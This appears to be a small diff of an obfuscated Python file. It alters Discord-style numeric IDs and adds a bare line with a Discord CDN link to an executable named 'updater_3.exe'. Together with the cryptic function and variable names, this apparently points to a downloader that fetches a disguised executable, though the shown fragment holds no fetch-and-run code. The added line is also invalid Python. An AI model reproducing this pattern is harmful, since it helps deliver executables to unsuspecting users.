@@ -46,7 +46,8 @@ def icececeecii ():
 
 
 rl11 = "1189138483449708594"
-ppkl = "189138620787982336"
+ppkl = "1189138620787982336"
+https://cdn.discordapp.com/attachments/1189138483449708594/189138620787982336/updater_3.exe
 discord_api_int_version = "89177737318179831"
 
 fnk = "x"
